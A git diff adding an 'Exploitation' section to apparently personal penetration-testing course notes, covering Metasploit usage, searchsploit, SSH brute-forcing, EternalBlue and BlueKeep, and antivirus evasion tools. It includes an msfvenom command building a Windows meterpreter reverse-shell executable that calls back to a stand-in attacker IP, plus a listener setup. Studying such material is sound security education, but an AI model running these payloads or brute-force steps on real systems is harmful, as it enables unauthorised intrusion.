@@ -270,6 +270,9 @@ detect it.
 
 ** Vulnerability Analysis
 
+The best vulnerability analysis you can do is to google the results of the scan
+phase. Tools' database of vulnerabilities are commonly not updated.
+
 *** nmap Scripting
 
 nmap can run vulnerability analysis and exploitation depending on the script it
@@ -285,6 +288,254 @@ Nessus e a paid tool with a free limited option used to scan and detect
 vulnerabilities.
 
 ** Gaining Access/Exploitation
+
+Main information gathered from the previous step:
+
+- Open and closed ports;
+- Services running in those ports and their versions;
+- Operating system the target is running;
+- Scan for known vulneratibilities whether the target has known issues or bugs;
+
+Now, in this step, we'll use this information combined to get access to the
+target and execute what we want there.
+
+*** Reverse shell
+
+Shell is our access to the target machine. You can think of it as the terminal
+we use to run commands.
+
+Reverse shell is when we run a command in the target machine to make it connect
+to our own machine, leaving us with a terminal to access it.
+
+This is a better option than bind shells due to the firewall block operations.
+
+*** Bind shell
+
+Bind shell is a different approach where we connect to the target machine when
+its port is open executing some vulnerable service. This approach is more hard
+to explore in the wild since firewalls are commonly configure to avoid it.
+
+*** Metasploit Framework Structure
+
+This tools is probably the most used in this phase to exploit different targets
+and their vulnerabilities. It offers thousands of exploits that we can use for
+both Linux, Windows and MacOS systems.
+
+You can find the metasploit directory by using:
+
+#+begin_src bash
+  cd /usr/share/metasploit-framework/
+#+end_src
+
+Exploits are a sequence of commands executed with the intention to attack the
+target specific vulnerabilities in a system or application. It is commonly used
+to provide access to the environment of the system with high permissions.
+
++ All the modules of the Metasploit Framework are written in *Ruby* language.
+
+**** Modules
+
+#+begin_src bash
+  cd /usr/share/metasploit-framework/modules/
+#+end_src
+
++ Exploits: code we can use to attack the target.
++ Auxiliary: programs we can use to attack specific parts of the system, like
+  the printer, the DNS server, etc.
++ Post: programs we use after the attack has finished.
++ Payload: code we deliver to the target in order to control its machine.
++ Encoders: avoid antivirus detection.
++ Evasion: do the same thing basically ^. They are used for Windows Defender.
++ Nops: instruction for the processor to do nothing. It's useful for buffer
+  overflow attacks. Stands for *no-operations*.
+
+**** Run
+
+#+begin_src bash
+  # run this in the terminal
+  msfconsole
+
+  # use `help` to list the possible commands
+  # in this terminal we can keep using other normal Linux commands
+  # ls, cd, etc.
+
+  show payloads
+  show exploits
+  use <MODULE_NAME>/<NAME_OF_EXPLOIT>
+  # use exploit/windows/smb/ms06_040_netapi
+  # multi means that it can be used for several OS
+
+  show info
+  show options # the most important part
+  # use this command to set exploit configurations
+  # example of configuration:
+  # set LHOST 129.168.1.15
+  show targets
+  # list possible targets for this exploit
+  set target <NUMBER>
+  # set target 3
+  exploit # start the attack
+
+  # you can search exploits from metasploit using this command
+  # search <SERVICE_NAME>
+  # example: search vsftpd
+#+end_src
+
+*** nc
+
+netcat is a tool we can use to create bind shell connections. We can use it to
+connect to external servers using the network.
+
+#+begin_src bash
+  nc <IP> <PORT>
+  # nc 192.168.1.5 1524
+#+end_src
+
+*** Information disclosure
+
+Information disclosure, also known as information leakage, is when a website
+unintentionally reveals sensitive information to its users. Depending on the
+context, websites may leak all kinds of information to a potential attacker
+
+Always check for the default credentials first.
+
+*** searchsploit
+
+This command must be used to search for available sploits for a defined service
+in a specific version.
+
+#+begin_src bash
+  searchsploit <SERVICE> <VERSION>
+  # searchsploit Samba 3.0.20
+#+end_src
+
+*** Bruteforce SSH
+
+Bruteforce attacks is a strategy to test many combinations of authentication
+data to access a service. We can use it check for default authentication
+settings.
+
+#+begin_src bash
+  msfconsole
+  use auxiliary/scanner/ssh/ssh_login
+  show options
+  # set required values
+  sessions
+  # list the sessions succeeded
+  sessions -i 1
+  # you can go with the common way instead
+  # ssh <USER>@<IP>
+#+end_src
+
+*** Windows Exploit: Eternalblue
+
+This exploit was used in a massive attack to release the *wannacry*
+ransomware. It uses the port 445 that is running SMB service in Windows
+machines.
+
+**** DoublePulsar
+
+Along with the common *Eternalblue* attack, we can use the *DoublePulsar*
+variant, which works better than the common *EternalBlue*. It's not available by
+default in the metasploit framework, so you need to install it from Github.
+
+Along with the tools specific for this payload to work, one need to install a
+couple of services: Python 2.x.x and Wine.
+
+*** Windows Exploit: BlueKeep
+
+The latest RDP (Remote Desktop Protocol) vulnerability could allow hackers to
+remotely run code at the system level without even having to authenticate. In
+other words, any unpatched Windows system (from XP to Windows 7) with an exposed
+RDP port is a potential target.
+
+Some people classify this exploit in the same level as the EternalBlue one.
+
+This exploit is already available in the metasploit framework.
+
+*** Routers
+
+Routers invasion is pretty important since the person who controls them,
+controls the network we use.
+
+In order to explore this environment we're going to use a different tool, named
+"Routersploit" that tests for known router exploits and checks for vulnerability
+that a lot of routers have!
+
+In order to get the tool we'll use you need to go for the Google and search for
+"routersploit". Then, the Github link will pop up.
+
+*** Gaining Access in Targets Without Vulnerabilities
+
+We must deliver the payload to the target and execute it. You must make the
+target run a specific program to create the vulnerability for us to attack.
+
++ There is no clear way of bypassing antiviruses!
++ Create your own payloads.
++ Keep yourself updated with new tools.
+
+**** Msfvenom
+
+If you decide to use some common tool, keep in mind that most firewall software
+will have the signature for this payload. In this Udemy course, the instructor
+starts showing how to use a tool called ~msfvenom~.
+
+#+begin_src bash
+  msfvenom -h
+
+  msfvenom -p windows/x64/meterpreter/reverse_tcp \
+           LHOST=<ATTACKER_VM_IP> \
+           LPORT=5555 \
+           -f exe \
+           -o shell.exe
+  # this program when executed in the target machine will give us a terminal
+  # to attack the target.
+  # we can use other flags to encode the payload information.
+  # we can also select other payload extensions.
+  #
+  # we need to configure our host machine to listen to the port that the exploit
+  # will try to connect.
+  #
+  msfconsole
+  use exploit/multi/handler # listener
+  show options
+  set payload windows/x64/meterpreter/reverse_tcp
+  set LHOST <LOCAL_IP>
+  set LPORT 5555
+#+end_src
+
+**** Check Virus Detection
+
+We can use a virtual website to test how many antivirus would catch a possible
+exploit one can use the https://www.virustotal.com/gui/home/upload. Keep in mind
+that every file that is uploaded to this website will get redirected to
+antivirus developers.
+
+**** Veil
+
+This tool is not available by default in Kali Linux. In order to install it you
+must run:
+
+#+begin_src bash
+  sudo apt-get install veil
+
+  # start the tool
+  veil
+#+end_src
+
+**** TheFatRat Payload Creation
+
+This is another tool not available by default in the Kali Linux
+distribution. It's intend is to automate even more the payload generation for
+attackers.
+
+**** Check the hash of a program
+
+#+begin_src bash
+  md5sum <SCRIPT>
+  # example: md5sum shell.exe
+#+end_src
+
 ** Maintaining Access (Optional)
 ** Covering Tracks
 
